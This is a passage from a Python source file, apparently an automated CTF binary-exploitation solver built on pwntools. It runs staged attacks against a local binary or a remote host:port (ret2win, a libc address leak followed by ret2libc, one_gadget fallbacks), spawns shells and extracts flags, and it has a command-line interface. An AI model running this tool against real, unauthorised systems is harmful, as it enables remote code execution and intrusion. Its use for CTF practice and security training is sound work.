        s = InteractiveSession(
            session.conn,
            binary=binary,
            source=source,
            libc_path=libc_path,
            flag_format=flag_format,
            bits=session.bits,
            offset=session.offset,
        )
        s._builder = builder
        # Drain any prompt then fire.
        s.recv(timeout=0.5)
        if s.send_ret2win(win_addr):
            flag = s.try_shell_for_flag(flag_format) or s.check_flag()
            if flag:
                return flag, s

    # Stage 2: leak -> libc -> ret2libc (needs a fresh process).
    if builder is not None and builder.solver is not None and session.bits == 64:
        stage1 = builder.build_leak_ret2libc_stage1(leak_func=leak_func)
        if stage1 is not None:
            payload, used_func = stage1
            try:
                conn2 = _fresh()
            except Exception:
                conn2 = None
            if conn2 is not None:
                s2 = InteractiveSession(
                    conn2,
                    binary=binary,
                    source=source,
                    libc_path=libc_path,
                    flag_format=flag_format,
                    bits=session.bits,
                    offset=session.offset,
                )
                s2._builder = builder
                s2.recv(timeout=0.5)
                s2.sendline(payload)
                # The leak prints right after our payload triggers puts(got).
                leak_line = s2.recvline(timeout=2.0)
                if not parse_leak(leak_line, bits=session.bits):
                    leak_line = s2.recvline(timeout=1.0)
                leaked = parse_leak(leak_line, bits=session.bits)
                if leaked:
                    libc = s2.resolve_libc(used_func, leaked)
                    if libc is not None:
                        # We returned to main, so a second overflow is possible.
                        s2.recv(timeout=0.5)
                        if s2.send_ret2libc():
                            flag = s2.try_shell_for_flag(flag_format) or s2.check_flag()
                            if flag:
                                return flag, s2
                        # Stage 3: one_gadget fallbacks (fresh conn each).
                        for og_payload in builder.build_one_gadget(libc, offset=session.offset):
                            try:
                                conn3 = _fresh()
                            except Exception:
                                break
                            s3 = InteractiveSession(
                                conn3,
                                binary=binary,
                                source=source,
                                libc_path=libc_path,
                                flag_format=flag_format,
                                bits=session.bits,
                                offset=session.offset,
                            )
                            s3._builder = builder
                            s3.libc = libc
                            s3.recv(timeout=0.3)
                            s3.sendline(og_payload)
                            flag = s3.try_shell_for_flag(flag_format) or s3.check_flag()
                            if flag:
                                return flag, s3
                            s3.close()

    return session.check_flag(), session


# ---------------------------------------------------------------------------
# Public helper API (auto_*.py convention)
# ---------------------------------------------------------------------------
def run(objective: str, **kwargs) -> list[dict]:
    """Helper-convention entry point.

    ``objective`` is the target: a local binary path, or ``host:port`` when
    ``remote=True`` (or when it already looks like ``host:port``).

    Recognised kwargs: ``remote`` (bool), ``binary`` (local binary to analyse
    for offsets/gadgets even when exploiting a remote target), ``source``,
    ``libc`` / ``libc_path``, ``win_addr``, ``leak_func``, ``flag_format``,
    ``bits``, ``offset``.

    Returns a list with a single result dict: ``{"flag", "found", "target",
    "transcript", "stages"}``.
    """
    is_remote = bool(kwargs.get("remote", False))
    libc_path = kwargs.get("libc") or kwargs.get("libc_path")
    binary = kwargs.get("binary")
    source = kwargs.get("source")
    win_addr = kwargs.get("win_addr")
    leak_func = kwargs.get("leak_func", "puts")
    flag_format = kwargs.get("flag_format", "")
    bits = int(kwargs.get("bits", 64))
    offset = kwargs.get("offset")

    if not PWNTOOLS_AVAILABLE:
        return [
            {
                "flag": None,
                "found": False,
                "target": objective,
                "transcript": "",
                "stages": [],
                "error": "pwntools not available",
            }
        ]

    # When exploiting a remote target, we still want the local binary (if any)
    # for offset/gadget analysis. If none supplied and the target is local,
    # the target *is* the binary.
    if binary is None and not is_remote and ":" not in objective:
        binary = objective

    if context is not None:
        context.log_level = "error"

    try:
        conn = PwnConnection.open(objective, is_remote=is_remote)
    except Exception as exc:
        return [{"flag": None, "found": False, "target": objective, "transcript": "", "stages": [], "error": str(exc)}]

    try:
        flag, session = auto_solve(
            conn,
            binary=binary,
            source=source,
            libc_path=libc_path,
            win_addr=win_addr,
            leak_func=leak_func,
            flag_format=flag_format,
            bits=bits,
            offset=offset,
        )
        transcript = session.conn.transcript_text()
    finally:
        try:
            conn.close()
        except Exception:
            pass

    return [
        {
            "flag": flag,
            "found": flag is not None,
            "target": objective,
            "transcript": transcript,
            "stages": ["banner", "ret2win", "leak->libc->ret2libc", "one_gadget"],
        }
    ]


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Interactive remote-pwn loop driver (leak -> libc -> ROP)",
    )
    parser.add_argument(
        "target",
        help="Local binary path, or host:port (use --remote for clarity)",
    )
    parser.add_argument("--remote", action="store_true", help="Treat target as host:port and connect over TCP")
    parser.add_argument(
        "--binary",
        default=None,
        help="Local copy of the binary for offset/gadget analysis (when exploiting a remote target)",
    )
    parser.add_argument("--source", default=None, help="Source file for offset analysis")
    parser.add_argument("--libc", default=None, help="Path to libc.so.6")
    parser.add_argument("--win-addr", default=None, help="Win function address (0x...) or symbol name")
    parser.add_argument("--leak-func", default="puts", help="Symbol to leak for libc resolution (default: puts)")
    parser.add_argument("--flag-format", default="", help="Flag format regex, e.g. 'flag\\{.*\\}'")
    parser.add_argument("--bits", type=int, default=64, choices=[32, 64], help="Target word size (default: 64)")
    parser.add_argument("--offset", type=int, default=None, help="Override the overflow offset (skip auto-detect)")
    parser.add_argument("--auto", action="store_true", help="Try all stages (default behaviour; kept for clarity)")
    args = parser.parse_args()

    if not PWNTOOLS_AVAILABLE:
        print("[-] pwntools is not available; cannot run interactive pwn", file=sys.stderr)
        sys.exit(2)

    win_addr: str | int | None = args.win_addr

    results = run(
        args.target,
        remote=args.remote,
        binary=args.binary,
        source=args.source,
        libc=args.libc,
        win_addr=win_addr,
        leak_func=args.leak_func,
        flag_format=args.flag_format,
        bits=args.bits,
        offset=args.offset,
    )
    result = results[0]

    if result.get("transcript"):
        print("=== transcript ===")
        print(result["transcript"])
        print("==================")

    if result.get("error"):
        print(f"[-] {result['error']}", file=sys.stderr)

    flag = result.get("flag")
    if flag:
        print(f"EXTRACTED FLAG: {flag}")
        sys.exit(0)
    print("[-] No flag extracted", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
